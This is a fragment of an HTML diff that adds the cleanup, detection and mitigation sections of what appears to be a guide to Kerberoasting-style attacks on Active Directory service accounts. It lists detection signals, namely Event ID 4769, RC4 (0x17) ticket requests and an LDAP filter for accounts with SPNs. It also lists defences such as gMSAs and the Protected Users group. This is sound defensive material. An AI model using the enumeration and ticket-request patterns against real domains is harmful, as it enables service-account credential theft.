-</span></code></pre></div></p>
+<h3 id="cleanup-considerations">Cleanup Considerations</h3>
+<ul>
+<li>None</li>
+</ul>
+<h3 id="detection-mitigation">Detection &amp; Mitigation</h3>
+<h4 id="detection">Detection</h4>
+<ul>
+<li>
+<p>Event ID 4769: A Kerberos service ticket was requested</p>
+</li>
+<li>
+<p>Requests where the Ticket Encryption Type is 0x17 (RC4). In a modern environment, this should be rare</p>
+</li>
+<li>
+<p>Requests for service tickets from unusual workstations or for accounts that rarely see this activity.</p>
+</li>
+<li>
+<p>LDAP queries that search for accounts with an SPN like <code>(servicePrincipalName=*)</code></p>
+</li>
+<li>
+<p>Create a honey account and make a custom alert for tickets requested for that account</p>
+</li>
+</ul>
+<h4 id="mitigation">Mitigation</h4>
+<ul>
+<li>
+<p><strong>Strong Passwords</strong>: This is the most effective mitigation. Enforce a strong password policy for service accounts</p>
+</li>
+<li>
+<p><strong>Use Group Managed Service Accounts</strong>: gMSAs are the gold standard. Their passwords are 240 characters long, complex, and automatically managed and rotated by Active Directory</p>
+</li>
+<li>
+<p><strong>Protected Users Group</strong>: Add high-value accounts (including service accounts where possible) to the "Protected Users" security group. This enforces stronger security controls, such as disabling NTLM and preventing the use of weaker Kerberos encryption types.</p>
+</li>
+</ul>
 
 
 
